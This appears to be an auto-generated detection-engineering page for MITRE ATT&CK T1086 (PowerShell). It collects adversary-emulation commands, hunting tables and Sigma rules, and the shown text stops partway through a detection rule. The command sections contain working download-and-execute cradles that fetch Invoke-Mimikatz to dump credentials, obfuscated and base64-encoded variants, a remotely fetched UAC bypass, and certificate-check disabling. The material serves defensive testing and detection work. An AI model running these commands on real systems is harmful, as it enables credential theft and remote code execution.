
# PowerShell

## Description

### MITRE Description

> PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

Administrator permissions are required to use PowerShell to connect to remote systems.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User', 'Administrator']
* Platforms: ['Windows']
* Remote: True
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1086

## Potential Commands

```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

write-host "Import and Execution of SharpHound.ps1 from PathToAtomicsFolder\T1086\src" -ForegroundColor Cyan
import-module PathToAtomicsFolder\T1086\src\SharpHound.ps1
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5

write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5

(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))

$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr

Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"

powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.xml');$Xml.command.a.execute | IEX"

C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/mshta.sct').Exec();close()"

# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))

powershell.exe -version 2 -Command Write-Host $PSVersion

Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
Invoke-Expression $streamcommand

{'windows': {'psh,pwsh': {'command': 'get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n'}}}
{'windows': {'psh': {'command': 'cmd.exe /c "net user" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c "whoami /priv" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c "netstat -ano" >> C:\\Windows\\temp\\history.log;'}}}
{'windows': {'psh,pwsh': {'command': 'powershell.exe -c "Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log";'}}}
{'windows': {'psh,pwsh': {'command': 'echo $(get-uac)\n'}}}
{'windows': {'psh': {'command': 'Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n'}}}
{'windows': {'psh,pwsh': {'command': 'start powershell.exe -ArgumentList "-NoP","-StA","-ExecutionPolicy","bypass",".\\Emulate-Administrator-Tasks.ps1"\n', 'cleanup': 'Remove-Item -Force -Path ".\\Emulate-Administrator-Tasks.ps1"\n', 'payloads': ['Emulate-Administrator-Tasks.ps1']}}}
{'windows': {'psh': {'command': 'powershell.exe -c IEX (New-Object Net.Webclient).downloadstring("https://bit.ly/33H0QXi") \n'}}}
{'windows': {'psh': {'command': 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n'}}}
{'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", "PSTools.zip");\nNew-Item -ItemType "directory" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly \'System.IO.Compression.FileSystem\'; [System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", "C:\\Windows\\System32\\PSTools");\n'}}}
excel.exe
cmd.exe
powershell.exe
excel.exe
powershell.exe
mshta.exe
cmd.exe
powershell.exe
mshta.exe
powershell.exe
powerpoint.exe
cmd.exe
powershell.exe
powerpoint.exe
powershell.exe
powershell.exe webClient.DownloadString(
powershell.exe webClient.DownloadFile
powershell.exe webClient.DownloadData
winword.exe
powershell.exe
\\Windows\\.+\\WindowsPowerShell\\.+\\powershell.exehidden|-enc|-NonI
powershell/lateral_movement/invoke_psremoting
powershell/lateral_movement/invoke_psremoting
powershell/management/spawn
powershell/management/spawn
python/management/multi/spawn
python/management/multi/spawn
```

## Commands Dataset

```
[{'command': 'powershell.exe "IEX (New-Object '
             "Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); "
             'Invoke-Mimikatz -DumpCreds"\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': 'write-host "Import and Execution of SharpHound.ps1 from '
             'PathToAtomicsFolder\\T1086\\src" -ForegroundColor Cyan\n'
             'import-module PathToAtomicsFolder\\T1086\\src\\SharpHound.ps1\n'
             'Invoke-BloodHound -OutputDirectory $env:Temp\n'
             'Start-Sleep 5\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': 'write-host "Remote download of SharpHound.ps1 into memory, '
             'followed by execution of the script" -ForegroundColor Cyan\n'
             'IEX (New-Object '
             "Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\n"
             'Invoke-BloodHound -OutputDirectory $env:Temp\n'
             'Start-Sleep 5\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': '(New-Object '
             "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n"
             '(New-Object '
             "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\n"
             "Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W "
             "'Net.WebClient';Set-Item Variable:\\gH "
             "'Default_File_Path.ps1';ls _-*;Set-Variable igZ "
             "(.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem "
             'Variable:0W).Value);Set-Variable J ((((Get-Variable igZ '
             "-ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ "
             '-ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item '
             'Variable:/HJ1).Value,(GV gH).Value);&( '
             "''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT "
             '-Enco 3 (GV gH).Value)))\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object "
             '-ComObject '
             "WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty "
             "$reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP "
             '$reg (Item Variable:_).Value[0] (Variable '
             '_).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item '
             'Variable:_).Value.id-ieq$curpid}|ForEach{(Variable '
             '_).Value.MainWindowTitle})){Start-Sleep -Milliseconds '
             '500};While(!$wshell.AppActivate($title)){Start-Sleep '
             "-Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep "
             "-Milliseconds 500;@($url,(' "
             "'*1000),'~')|ForEach{$wshell.SendKeys((Variable "
             '_).Value)};$res=$Null;While($res.Length -lt '
             "2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item "
             'Variable:_).Value)};Start-Sleep -Milliseconds '
             "500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable "
             '_).Value)};If(GPS|?{(Item '
             "Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item "
             "Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP "
             '$reg (Item Variable:_).Value $props.((Variable '
             '_).Value)};IEX($res);invoke-mimikatz -dumpcr\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': 'Powershell.exe "IEX (New-Object '
             "Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); "
             'Invoke-AppPathBypass -Payload '
             '\'C:\\Windows\\System32\\cmd.exe\'"\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': 'powershell.exe -exec bypass -noprofile "$comMsXml=New-Object '
             '-ComObject '
             "MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1',$False);$comMsXml.Send();IEX "
             '$comMsXml.ResponseText"\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
             '-exec bypass -noprofile "$Xml = (New-Object '
             "System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.xml');$Xml.command.a.execute "
             '| IEX"\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': 'C:\\Windows\\system32\\cmd.exe /c "mshta.exe '
             'javascript:a=GetObject(\'script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/mshta.sct\').Exec();close()"\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': '# Encoded payload in next command is the following "Set-Content '
             '-path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from '
             'the Atomic Red Team""\n'
             'reg.exe add '
             '"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam" /v ART /t '
             'REG_SZ /d '
             '"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="\n'
             'iex '
             '([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp '
             "'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n",
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': 'powershell.exe -version 2 -Command Write-Host $PSVersion\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': "Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host "
             '"Stream Data Executed"\' -Stream \'streamCommand\'\n'
             '$streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt '
             "-Stream 'streamcommand'\n"
             'Invoke-Expression $streamcommand\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': {'windows': {'psh,pwsh': {'command': 'get-process >> '
                                                  '$env:APPDATA\\vmtools.log;\n'
                                                  'cat '
                                                  '$env:APPDATA\\vmtools.log\n'}}},
  'name': 'Capture running processes via PowerShell',
  'source': 'data/abilities/collection/4d9b079c-9ede-4116-8b14-72ad3a5533af.yml'},
 {'command': {'windows': {'psh': {'command': 'cmd.exe /c "net user" >> '
                                             'C:\\Windows\\temp\\history.log;\n'
                                             'cmd.exe /c "whoami /priv" >> '
                                             'C:\\Windows\\temp\\history.log;\n'
                                             'cmd.exe /c "netstat -ano" >> '
                                             'C:\\Windows\\temp\\history.log;'}}},
  'name': 'User enumeration',
  'source': 'data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml'},
 {'command': {'windows': {'psh,pwsh': {'command': 'powershell.exe -c '
                                                  '"Get-WmiObject -class '
                                                  'win32_operatingsystem | '
                                                  'select -property * | '
                                                  'export-csv msdebug.log";'}}},
  'name': 'System Information Gathering Script',
  'source': 'data/abilities/collection/702bfdd2-9947-4eda-b551-c3a1ea9a59a2.yml'},
 {'command': {'windows': {'psh,pwsh': {'command': 'echo $(get-uac)\n'}}},
  'name': 'Determine whether or not UAC is enabled',
  'source': 'data/abilities/collection/7c42a30c-c8c7-44c5-80a8-862d364ac1e4.yml'},
 {'command': {'windows': {'psh': {'command': 'Copy-Item '
                                             'C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe '
                                             'C:\\Windows\\Temp\\debug.exe;\n'
                                             'C:\\Windows\\Temp\\debug.exe '
                                             'get-process >> '
                                             'C:\\Windows\\temp\\debug.log;\n'
                                             'C:\\Windows\\Temp\\debug.exe '
                                             'get-localgroup >> '
                                             'C:\\Windows\\temp\\debug.log;\n'
                                             'C:\\Windows\\Temp\\debug.exe '
                                             'get-localuser >> '
                                             'C:\\Windows\\temp\\debug.log;\n'
                                             'C:\\Windows\\Temp\\debug.exe '
                                             'Get-ItemProperty '
                                             'Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion '
                                             '>> '
                                             'C:\\Windows\\temp\\debug.log;\n'}}},
  'name': 'Copy powershell to non-standard location and perform triage '
          'commands',
  'source': 'data/abilities/defense-evasion/e5f9de8f-3df1-4e78-ad92-a784e3f6770d.yml'},
 {'command': {'windows': {'psh,pwsh': {'cleanup': 'Remove-Item -Force -Path '
                                                  '".\\Emulate-Administrator-Tasks.ps1"\n',
                                       'command': 'start powershell.exe '
                                                  '-ArgumentList '
                                                  '"-NoP","-StA","-ExecutionPolicy","bypass",".\\Emulate-Administrator-Tasks.ps1"\n',
                                       'payloads': ['Emulate-Administrator-Tasks.ps1']}}},
  'name': 'Emulate administrator tasks on a system in a separate process',
  'source': 'data/abilities/execution/315cedf1-4a3a-4015-b63f-149d64bacbbc.yml'},
 {'command': {'windows': {'psh': {'command': 'powershell.exe -c IEX '
                                             '(New-Object '
                                             'Net.Webclient).downloadstring("https://bit.ly/33H0QXi") \n'}}},
  'name': 'Download',
  'source': 'data/abilities/execution/bfff9006-d1fb-46ce-b173-92cb04e9a031.yml'},
 {'command': {'windows': {'psh': {'command': 'powershell -enc '
                                             'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n'}}},
  'name': 'Download',
  'source': 'data/abilities/execution/ccdb8caf-c69e-424b-b930-551969450c57.yml'},
 {'command': {'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback '
                                             '= { $True };\n'
                                             '$web = (New-Object '
                                             'System.Net.WebClient);\n'
                                             '$result = '
                                             '$web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", '
                                             '"PSTools.zip");\n'
                                             'New-Item -ItemType "directory" '
                                             'C:\\Windows\\System32\\PSTools '
                                             '-Force;\n'
                                             'Add-Type -Assembly '
                                             "'System.IO.Compression.FileSystem'; "
                                             '[System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", '
                                             '"C:\\Windows\\System32\\PSTools");\n'}}},
  'name': 'Download and install PSTools by unzipping the file',
  'source': 'data/abilities/execution/eb814e03-811a-467a-bc6d-dcd453750fa2.yml'},
 {'command': 'excel.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_2',
  'source': 'Threat Hunting Tables'},
 {'command': 'excel.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'mshta.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_2',
  'source': 'Threat Hunting Tables'},
 {'command': 'mshta.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'powerpoint.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_2',
  'source': 'Threat Hunting Tables'},
 {'command': 'powerpoint.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe webClient.DownloadString(',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe webClient.DownloadFile',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe webClient.DownloadData',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'winword.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': '\\\\Windows\\\\.+\\\\WindowsPowerShell\\\\.+\\\\powershell.exehidden|-enc|-NonI',
  'name': None,
  'source': 'SysmonHunter - PowerShell'},
 {'command': 'powershell/lateral_movement/invoke_psremoting',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/lateral_movement/invoke_psremoting',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/spawn',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/spawn',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/multi/spawn',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/multi/spawn',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'date': '2018/12/04',
                  'description': 'This method detects a suspicious powershell '
                                 'command line combination as used by APT29 in '
                                 'a campaign against US think tanks',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': '*-noni -ep '
                                                             'bypass $*'}},
                  'falsepositives': ['unknown'],
                  'id': '033fe7d6-66d1-4240-ac6b-28908009c71f',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://cloudblogs.microsoft.com/microsoftsecure/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/'],
                  'tags': ['attack.execution', 'attack.g0016', 'attack.t1086'],
                  'title': 'APT29'}},
 {'data_source': {'action': 'global',
                  'author': 'Markus Neis',
                  'date': '2019/04/02',
                  'description': 'Detects EmpireMonkey APT reported Activity',
                  'detection': {'condition': '1 of them'},
                  'falsepositives': ['Very Unlikely'],
                  'id': '10152a7b-b566-438f-a33c-390b607d1c8d',
                  'level': 'critical',
                  'references': ['https://app.any.run/tasks/a4107649-8cb0-41af-ad75-113152d4d57b'],
                  'tags': ['attack.t1086', 'attack.execution'],
                  'title': 'Empire Monkey'}},
 {'data_source': {'detection': {'selection_cutil': {'CommandLine': ['*/i:%APPDATA%\\logs.txt '
                                                                    'scrobj.dll'],
                                                    'Image': ['*\\cutil.exe']},
                                'selection_regsvr32': {'CommandLine': ['*/i:%APPDATA%\\logs.txt '
                                                                       'scrobj.dll'],
                                                       'Description': ['Microsoft(C) '
                                                                       'Registerserver']}},
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'}}},
 {'data_source': {'author': 'Florian Roth (rule), Lee Holmes (idea)',
                  'description': 'Detects PowerShell downgrade attack by '
                                 'comparing the host versions with the '
                                 'actually used engine version 2.0',
                  'detection': {'condition': 'selection and not filter',
                                'filter': {'HostVersion': '2.*'},
                                'selection': {'EngineVersion': '2.*',
                                              'EventID': 400}},
                  'falsepositives': ['Penetration Test', 'Unknown'],
                  'id': '6331d09b-4785-4c13-980f-f96661356249',
                  'level': 'medium',
                  'logsource': {'product': 'windows',
                                'service': 'powershell-classic'},
                  'references': ['http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1086'],
                  'title': 'PowerShell Downgrade Attack'}},
 {'data_source': {'author': 'Sean Metcalf (source), Florian Roth (rule)',
                  'description': 'Detects PowerShell called from an executable '
                                 'by the version mismatch method',
                  'detection': {'condition': 'selection1',
                                'selection1': {'EngineVersion': ['2.*',
                                                                 '4.*',
                                                                 '5.*'],
                                               'EventID': 400,
                                               'HostVersion': '3.*'}},
                  'falsepositives': ['Penetration Tests', 'Unknown'],
                  'id': 'c70e019b-1479-4b65-b0cc-cd0c6093a599',
                  'level': 'high',
                  'logsource': {'product': 'windows',
                                'service': 'powershell-classic'},
                  'references': ['https://adsecurity.org/?p=2921'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
